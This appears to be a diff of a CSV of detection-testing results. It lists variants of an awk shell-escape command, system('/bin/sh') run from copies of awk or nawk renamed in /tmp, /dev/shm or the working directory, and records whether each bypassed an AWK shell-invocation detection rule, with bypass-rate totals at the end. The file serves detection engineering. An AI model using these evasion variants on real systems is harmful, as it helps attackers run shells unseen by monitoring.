-272,"cp /usr/bin/nawk /tmp/n2; /tmp/n2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack272.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+271,"cp $(which nawk) /tmp/n1; /tmp/n1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack271.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+272,"cp /usr/bin/nawk /tmp/n2; /tmp/n2 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack272.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 273,"cp /bin/nawk ./n3; ./n3 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack273.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-274,"install /usr/bin/nawk /tmp/n4; /tmp/n4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack274.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-275,"ln /bin/nawk /tmp/n5; /tmp/n5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack275.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+274,"install /usr/bin/nawk /tmp/n4; /tmp/n4 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack274.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+275,"ln /bin/nawk /tmp/n5; /tmp/n5 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack275.log,Trigger: Suspicious Invocation of Shell via AWK - Linux,Execution Of Script Located In Potentially Suspicious Directory | Suspicious Invocation of Shell via AWK - Linux | Syslog Clearing or Removal Via System Utilities
 276,"cp $(command -v nawk) ./n6; ./n6 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack276.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 277,"cp /usr/bin/awk /dev/shm/ax; /dev/shm/ax 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack277.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
-278,"cp /usr/bin/awk /tmp/.awk; /tmp/.awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack278.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-279,"cp /usr/bin/awk /tmp/shellcaller; /tmp/shellcaller 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack279.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
-280,"cp /usr/bin/awk /var/tmp/x; /var/tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack280.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities | Execution Of Script Located In Potentially Suspicious Directory
+278,"cp /usr/bin/awk /tmp/.awk; /tmp/.awk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack278.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+279,"cp /usr/bin/awk /tmp/shellcaller; /tmp/shellcaller 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack279.log,Bypass Target Rule,Shell Execution Of Process Located In Tmp Directory | Potentially Suspicious Execution From Tmp Folder | Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
+280,"cp /usr/bin/awk /var/tmp/x; /var/tmp/x 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack280.log,Bypass Target Rule,Execution Of Script Located In Potentially Suspicious Directory | Syslog Clearing or Removal Via System Utilities
 281,"cp /usr/bin/awk ./awk1; ./awk1 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack281.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 282,"cp /usr/bin/awk ./runawk; ./runawk 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack282.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
 283,"cp /usr/bin/awk ./cmd; ./cmd 'BEGIN {system(""/bin/sh"")}'",Suspicious_Invocation_of_Shell_via_AWK_attack283.log,Bypass Target Rule,Syslog Clearing or Removal Via System Utilities
@@ -303,14 +266,10 @@ ID,Command,Log File,Result,All Detected Rules
 ,,,,
 ,,,,
 === SUMMARY REPORT ===,,,,
-Calculation Base (Source: filtered_summary.txt),,,,
-Total Meaningful Logs (Denominator),271,,,
-Triggered Target (Detections),125,,,
-Bypass Logs (Numerator),146,,,
-BYPASS RATE (Bypass/Meaningful),146 / 271 (53.87%),,,
-BYPASS RAIO (Bypass/Detections),1.17,,,
+Calculation Base (Source: Detection Results),,,,
+Total Meaningful Logs (Denominator),264,,,
+Triggered Target (Detections),84,,,
+Bypass Logs (Numerator),180,,,
+BYPASS RATE (Bypass/Meaningful),180 / 264 (68.18%),,,
 ,,,,
---- DETAILS (From raw scan) ---,,,,
-  > Bypass All (Raw),0,,,
-  > Bypass Target Rule (Raw),180,,,
-Missing/Not Run,37,,,
+Note: Discrepancy with Filter Summary,"Filter kept 271, but found 264 results.",,,
